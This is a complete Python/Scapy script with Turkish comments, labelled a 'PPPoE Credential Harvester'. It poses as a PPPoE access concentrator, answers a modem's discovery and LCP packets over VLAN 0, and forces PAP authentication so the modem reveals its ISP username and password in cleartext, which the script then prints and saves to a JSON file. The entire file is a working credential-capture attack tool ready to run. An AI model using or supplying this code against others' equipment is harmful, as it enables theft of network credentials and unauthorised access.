#!/usr/bin/env python3
"""
PPPoE Credential Harvester v2.0
===============================
Bu araç, modemlerin VLAN 0 (Priority Tagging) kullanarak gönderdiği
PPPoE paketlerini yakalamak ve PAP (Password Authentication Protocol)
üzerinden şifreyi açık metin olarak elde etmek için geliştirilmiştir.

Kullanım:
    sudo python3 harvester.py
    sudo python3 harvester.py -i eth0
    sudo python3 harvester.py -i enp8s0 -t 120
"""

from scapy.all import *
from scapy.layers.l2 import Dot1Q, Ether
from scapy.layers.ppp import PPPoE, PPPoED, PPP_PAP_Request, PPP
import os
import sys
import struct
import signal
import argparse
import random
import json
from datetime import datetime
from pathlib import Path

# --- SABITLER ---
DEFAULT_IFACE = "enp8s0"
DEFAULT_TIMEOUT = 180  # saniye
SESSION_ID = 0x5555
LOG_DIR = Path(__file__).parent.parent / "logs"


class PPPoEHarvester:
    """PPPoE VLAN-Aware Credential Harvester"""

    def __init__(self, iface, timeout):
        self.iface = iface
        self.timeout = timeout
        self.my_mac = get_if_hwaddr(iface)
        self.magic_number = random.randint(0, 0xFFFFFFFF)
        self.sent_lcp = False
        self.last_ack_id = -1
        self.start_time = None

        # Log dizinini oluştur
        LOG_DIR.mkdir(parents=True, exist_ok=True)

    @staticmethod
    def get_tag(tag_type, tag_value):
        """PPPoE Discovery Tag oluştur"""
        if isinstance(tag_value, str):
            tag_value = tag_value.encode()
        return struct.pack("!HH", tag_type, len(tag_value)) + tag_value

    def _extract_host_cookie(self, raw_payload):
        """PPPoED payload'dan Host-Uniq (0x0103) tag'ini çıkar"""
        tags = b""
        idx = 0
        while idx + 4 <= len(raw_payload):
            t_type, t_len = struct.unpack("!HH", raw_payload[idx:idx + 4])
            if t_type == 0x0103:
                tags += self.get_tag(0x0103, raw_payload[idx + 4:idx + 4 + t_len])
            idx += 4 + t_len
        return tags

    def _get_vlan_info(self, pkt):
        """Paketten VLAN bilgilerini çıkar"""
        vlan_id = pkt[Dot1Q].vlan if pkt.haslayer(Dot1Q) else 0
        prio = pkt[Dot1Q].prio if pkt.haslayer(Dot1Q) else 1
        return vlan_id, prio

    def _handle_padi(self, pkt, vlan_id, prio):
        """PADI → PADO: Modem 'Kimse var mı?' dedi, biz cevap veriyoruz"""
        print(f"[*] PADI Yakalandı (MAC: {pkt.src})")
        self.sent_lcp = False
        self.last_ack_id = -1

        tags = self.get_tag(0x0101, "BRAS") + self.get_tag(0x0102, "")
        tags += self._extract_host_cookie(bytes(pkt[PPPoED].payload))

        resp = (Ether(dst=pkt.src, src=self.my_mac) /
                Dot1Q(vlan=vlan_id, prio=prio) /
                PPPoED(code=0x07, sessionid=0, len=len(tags)))
        sendp(bytes(resp) + tags, iface=self.iface, verbose=False)
        print("[+] PADO Gönderildi (VLAN 0 Response)")

    def _handle_padr(self, pkt, vlan_id, prio):
        """PADR → PADS: Modem bizi seçti, oturum açıyoruz"""
        print(f"[*] PADR Yakalandı (MAC: {pkt.src})")

        tags = self.get_tag(0x0102, "")
        tags += self._extract_host_cookie(bytes(pkt[PPPoED].payload))

        resp = (Ether(dst=pkt.src, src=self.my_mac) /
                Dot1Q(vlan=vlan_id, prio=prio) /
                PPPoED(code=0x65, sessionid=SESSION_ID, len=len(tags)))
        sendp(bytes(resp) + tags, iface=self.iface, verbose=False)
        print(f"[+] PADS Gönderildi (Session ID: {hex(SESSION_ID)})")

    def _handle_lcp(self, pkt, vlan_id, prio):
        """LCP Config-Request → ACK + kendi PAP talebimizi gönder"""
        raw_ppp = bytes(pkt[PPP].payload)
        if len(raw_ppp) < 4:
            return

        lcp_code, lcp_id, lcp_len = struct.unpack("!BBH", raw_ppp[:4])

        # Configure-Request (0x01)
        if lcp_code == 0x01:
            if lcp_id != self.last_ack_id:
                print(f"[*] LCP Config-Request (ID: {lcp_id})")
                # ACK Gönder
                lcp_payload = struct.pack("!BBH", 0x02, lcp_id, lcp_len) + raw_ppp[4:lcp_len]
                resp_hdr = (Ether(dst=pkt.src, src=self.my_mac) /
                            Dot1Q(vlan=vlan_id, prio=prio) /
                            PPPoE(sessionid=SESSION_ID, len=2 + lcp_len) /
                            PPP(proto=0xc021))
                sendp(bytes(resp_hdr) + lcp_payload, iface=self.iface, verbose=False)
                print(f"[+] LCP ACK İletildi (ID: {lcp_id})")
                self.last_ack_id = lcp_id

            # PAP talebi gönder (sadece bir kez)
            if not self.sent_lcp:
                magic_bytes = struct.pack("!I", self.magic_number)
                # MRU(1492) + Auth(PAP) + MagicNumber(rastgele)
                opts = b"\x01\x04\x05\xd4\x03\x04\xc0\x23\x05\x06" + magic_bytes
                lcp_req_payload = struct.pack("!BBH", 0x01, 0x01, 4 + len(opts)) + opts
                lcp_req_hdr = (Ether(dst=pkt.src, src=self.my_mac) /
                               Dot1Q(vlan=vlan_id, prio=prio) /
                               PPPoE(sessionid=SESSION_ID, len=2 + len(lcp_req_payload)) /
                               PPP(proto=0xc021))
                sendp(bytes(lcp_req_hdr) + lcp_req_payload, iface=self.iface, verbose=False)
                print("[+] PAP Auth Talebi Gönderildi")
                self.sent_lcp = True

    def _handle_pap(self, pkt):
        """PAP Request → Şifre yakalandı!"""
        print("\n" + "!" * 60 + "\n🎉 PPPoE KİMLİK BİLGİLERİ YAKALANDI!")
        try:
            p_data = bytes(pkt[PPP].payload) if pkt.haslayer(PPP) else bytes(pkt[PPP_PAP_Request])
            if p_data[0] == 0x01:  # Authenticate-Request
                u_len = p_data[4]
                user = p_data[5:5 + u_len].decode('utf-8', errors='ignore')
                p_len = p_data[5 + u_len]
                password = p_data[6 + u_len:6 + u_len + p_len].decode('utf-8', errors='ignore')

                print(f"Kullanıcı Adı: {user}\nŞifre:        {password}")
                print("!" * 60 + "\n")

                # Sonuçları log dosyasına kaydet
                self._save_credentials(user, password)
                sys.exit(0)
        except Exception as e:
            print(f"[!] Ayrıştırma hatası: {e}")
            if 'p_data' in locals():
                print(f"[!] Ham Veri: {p_data.hex()}")

    def _save_credentials(self, username, password):
        """Yakalanan kimlik bilgilerini log dosyasına kaydet"""
        result = {
            "username": username,
            "password": password,
            "timestamp": datetime.now().isoformat(),
            "interface": self.iface,
            "method": "scapy_vlan_aware_harvester"
        }

        log_file = LOG_DIR / f"credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(log_file, 'w') as f:
                json.dump(result, f, indent=2, ensure_ascii=False)
            print(f"[+] Sonuçlar kaydedildi: {log_file}")
        except Exception as e:
            print(f"[!] Log kaydetme hatası: {e}")

    def handle_pkt(self, pkt):
        """Ana paket işleyici"""
        # Timeout kontrolü
        if self.timeout and self.start_time:
            elapsed = time.time() - self.start_time
            if elapsed > self.timeout:
                print(f"\n[!] Zaman aşımı ({self.timeout}s). Şifre yakalanamadı.")
                print("[*] Modemi yeniden başlatıp tekrar deneyin.")
                sys.exit(1)

        # --- DISCOVERY (0x8863) ---
        if pkt.haslayer(PPPoED):
            vlan_id, prio = self._get_vlan_info(pkt)

            if pkt[PPPoED].code == 0x09:  # PADI
                self._handle_padi(pkt, vlan_id, prio)
            elif pkt[PPPoED].code == 0x19:  # PADR
                self._handle_padr(pkt, vlan_id, prio)

        # --- SESSION (0x8864) ---
        elif pkt.haslayer(PPPoE):
            vlan_id, prio = self._get_vlan_info(pkt)

            # LCP (0xc021)
            if pkt.haslayer(PPP) and pkt[PPP].proto == 0xc021:
                self._handle_lcp(pkt, vlan_id, prio)

            # PAP (0xc023) Request
            elif pkt.haslayer(PPP_PAP_Request) or (pkt.haslayer(PPP) and pkt[PPP].proto == 0xc023):
                self._handle_pap(pkt)

    def run(self):
        """Harvester'ı başlat"""
        print(f"[*] {self.iface} üzerinde Harvester Başlatıldı (VLAN-Aware)...")
        print(f"[*] Magic Number: {hex(self.magic_number)}")
        if self.timeout:
            print(f"[*] Zaman aşımı: {self.timeout} saniye")
        print("[!] HAZIR! Modemi şimdi yeniden başlatın.\n")

        self.start_time = time.time()

        # Ctrl+C ile temiz çıkış
        def signal_handler(sig, frame):
            print("\n[*] Kullanıcı tarafından durduruldu.")
            sys.exit(0)
        signal.signal(signal.SIGINT, signal_handler)

        sniff(iface=self.iface, prn=self.handle_pkt, store=0)


def main():
    parser = argparse.ArgumentParser(
        description="PPPoE Credential Harvester - VLAN 0 Aware",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Örnekler:
  sudo python3 harvester.py                    # Varsayılan arayüz (enp8s0)
  sudo python3 harvester.py -i eth0            # Farklı arayüz
  sudo python3 harvester.py -i enp8s0 -t 120   # 2 dakika timeout
  sudo python3 harvester.py -t 0               # Timeout yok (sonsuz bekleme)
        """
    )
    parser.add_argument(
        "-i", "--interface",
        default=DEFAULT_IFACE,
        help=f"Ethernet arayüzü (varsayılan: {DEFAULT_IFACE})"
    )
    parser.add_argument(
        "-t", "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        help=f"Bekleme zaman aşımı, saniye (varsayılan: {DEFAULT_TIMEOUT}, 0=sınırsız)"
    )
    args = parser.parse_args()

    timeout = args.timeout if args.timeout > 0 else None

    harvester = PPPoEHarvester(iface=args.interface, timeout=timeout)
    harvester.run()


if __name__ == "__main__":
    main()
